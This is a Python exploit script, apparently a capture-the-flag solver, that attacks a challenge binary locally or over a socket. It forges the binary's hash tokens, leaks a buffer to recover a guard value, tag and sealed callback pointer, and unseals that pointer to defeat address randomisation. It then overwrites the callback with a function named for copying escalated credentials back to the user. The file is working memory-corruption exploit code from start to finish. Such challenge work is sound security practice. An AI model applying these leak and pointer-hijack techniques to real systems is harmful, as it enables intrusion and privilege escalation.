#!/usr/bin/env python3
import os
import socket
import struct
import subprocess
import sys
from typing import Optional


ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
BIN = os.path.join(ROOT, "dist", "Siuuuuuuu")
DEBUG_BIN = os.path.join(ROOT, "build", "Siuuuuuuu.debug")

PIPE_CAP = 0x60
AAD_MAGIC = 0x31431EE7C0DECAFE
SEAL_ADD = 0x6A09E667F3BCC909
SPLICE_MAGIC = 0xD6E8FEB86659FD93
RECV_MAGIC = 0xA4093822299F31D0
TICKET_MAGIC = 0x85D35A47C0F2B91E
MASK = (1 << 64) - 1

CATALOG = b"matchday-elite-catalog"
KEY = "VIP-ORDER-2026:" + "7" * 56


def rol64(x: int, r: int) -> int:
    x &= MASK
    return ((x << r) | (x >> (64 - r))) & MASK


def ror64(x: int, r: int) -> int:
    x &= MASK
    return ((x >> r) | (x << (64 - r))) & MASK


def mix64(x: int) -> int:
    x &= MASK
    x ^= x >> 30
    x = (x * 0xBF58476D1CE4E5B9) & MASK
    x ^= x >> 27
    x = (x * 0x94D049BB133111EB) & MASK
    x ^= x >> 31
    return x & MASK


def fnv1a64(data: bytes) -> int:
    h = 0xCBF29CE484222325
    for b in data:
        h ^= b
        h = (h * 0x100000001B3) & MASK
    return h


def p64(x: int) -> bytes:
    return struct.pack("<Q", x & MASK)


def u64(x: bytes) -> int:
    return struct.unpack("<Q", x)[0]


def seal_ptr(ptr: int, guard: int, tag: int) -> int:
    x = ptr ^ guard
    x = rol64(x, 17)
    x = (x + SEAL_ADD) & MASK
    x ^= tag
    return x & MASK


def unseal_ptr(sealed: int, guard: int, tag: int) -> int:
    x = sealed ^ tag
    x = (x - SEAL_ADD) & MASK
    x = ror64(x, 17)
    x ^= guard
    return x & MASK


def splice_token(key_hash: int, cmsg_hash: int, length: int) -> int:
    return mix64(length ^ key_hash ^ rol64(cmsg_hash, 5) ^ SPLICE_MAGIC) & 0xFFFFFFFF


def recv_token(cmsg_hash: int, copied: int, off: int, length: int) -> int:
    return mix64(off ^ rol64(length, 17) ^ cmsg_hash ^ copied ^ RECV_MAGIC) & 0xFFFFFFFF


def wanted_ticket(key_hash: int, cmsg_hash: int, epoch: int, request_len: int, copied: int) -> int:
    x = TICKET_MAGIC
    x ^= key_hash
    x ^= rol64(cmsg_hash, 13)
    x ^= epoch
    x ^= request_len
    x ^= (copied << 7) & MASK
    return mix64(x)


def symbol(name: str) -> int:
    if not os.path.exists(DEBUG_BIN):
        subprocess.check_call(["make"], cwd=ROOT)
    out = subprocess.check_output(["nm", "-n", DEBUG_BIN], text=True)
    for line in out.splitlines():
        parts = line.split()
        if len(parts) == 3 and parts[2] == name:
            return int(parts[0], 16)
    raise SystemExit(f"missing symbol: {name}")


class Tube:
    def __init__(self, host: Optional[str] = None, port: Optional[int] = None):
        self.buf = b""
        self.sock = None
        self.proc = None
        if host is None:
            self.proc = subprocess.Popen(
                [BIN],
                cwd=ROOT,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
            )
        else:
            self.sock = socket.create_connection((host, int(port)))

    def send(self, data: bytes) -> None:
        if self.sock is not None:
            self.sock.sendall(data)
        else:
            self.proc.stdin.write(data)
            self.proc.stdin.flush()

    def _recv_raw(self, n: int = 4096) -> bytes:
        if self.sock is not None:
            return self.sock.recv(n)
        return os.read(self.proc.stdout.fileno(), n)

    def recv_until(self, marker: bytes) -> bytes:
        while marker not in self.buf:
            chunk = self._recv_raw()
            if not chunk:
                raise EOFError(marker)
            self.buf += chunk
        idx = self.buf.index(marker) + len(marker)
        out = self.buf[:idx]
        self.buf = self.buf[idx:]
        return out

    def recv_exact(self, n: int) -> bytes:
        while len(self.buf) < n:
            chunk = self._recv_raw()
            if not chunk:
                raise EOFError(n)
            self.buf += chunk
        out = self.buf[:n]
        self.buf = self.buf[n:]
        return out

    def drain(self) -> bytes:
        data = self.buf
        self.buf = b""
        if self.sock is not None:
            self.sock.settimeout(0.5)
            while True:
                try:
                    chunk = self.sock.recv(4096)
                except (TimeoutError, socket.timeout):
                    break
                if not chunk:
                    break
                data += chunk
            return data

        try:
            data += self.proc.communicate(timeout=1)[0]
        except subprocess.TimeoutExpired:
            self.proc.kill()
            data += self.proc.communicate()[0]
        return data


def main() -> None:
    if not os.path.exists(BIN):
        subprocess.check_call(["make"], cwd=ROOT)

    host = sys.argv[1] if len(sys.argv) >= 3 else None
    port = int(sys.argv[2]) if len(sys.argv) >= 3 else None
    io = Tube(host, port)

    key_hash = fnv1a64(KEY.encode())
    aad = key_hash ^ AAD_MAGIC
    cmsg_hash = mix64(3 ^ (2 << 11) ^ (4 << 22) ^ aad ^ rol64(key_hash, 9))

    leak_len = 0x100
    first_copy_len = PIPE_CAP
    first_copy = b"L" * first_copy_len

    setup = b"".join(
        [
            b"1\n38\n5\n0\n",
            b"2\n" + CATALOG + b"\n",
            b"3\n1\n" + KEY.encode() + b"\n",
            b"3\n5\n4\n",
            b"4\n41414141\n3\n2\n4\n" + str(aad).encode() + b"\n",
            b"5\n"
            + str(first_copy_len).encode()
            + b"\n"
            + str(splice_token(key_hash, cmsg_hash, first_copy_len)).encode()
            + b"\n"
            + first_copy,
            b"6\n0\n"
            + str(leak_len).encode()
            + b"\n"
            + str(recv_token(cmsg_hash, first_copy_len, 0, leak_len)).encode()
            + b"\n",
        ]
    )
    io.send(setup)
    io.recv_until(b"-----BEGIN RECEIPT-----\n")
    leak = io.recv_exact(leak_len)
    io.recv_until(b"-----END RECEIPT-----")

    copied = u64(leak[0x60:0x68])
    epoch = u64(leak[0x68:0x70])
    guard = u64(leak[0x70:0x78])
    sealed_cb = u64(leak[0x78:0x80])
    tag = u64(leak[0x88:0x90])

    reject_off = symbol("reject_completion")
    target_off = symbol("copy_escalated_cred_back_to_user")
    reject_runtime = unseal_ptr(sealed_cb, guard, tag)
    pie_base = reject_runtime - reject_off
    target_runtime = pie_base + target_off

    final_len = 0x100
    ticket = wanted_ticket(key_hash, cmsg_hash, epoch, final_len, final_len)
    sealed_target = seal_ptr(target_runtime, guard, tag)

    payload = b"A" * 0x60
    payload += p64(copied)
    payload += p64(epoch)
    payload += p64(guard)
    payload += p64(sealed_target)
    payload += p64(ticket)
    payload += p64(tag)
    payload = payload.ljust(final_len, b"S")

    trigger = b"".join(
        [
            b"5\n"
            + str(final_len).encode()
            + b"\n"
            + str(splice_token(key_hash, cmsg_hash, final_len)).encode()
            + b"\n",
            payload,
            b"7\n",
        ]
    )
    io.send(trigger)
    out = io.drain()
    sys.stdout.buffer.write(out)


if __name__ == "__main__":
    main()
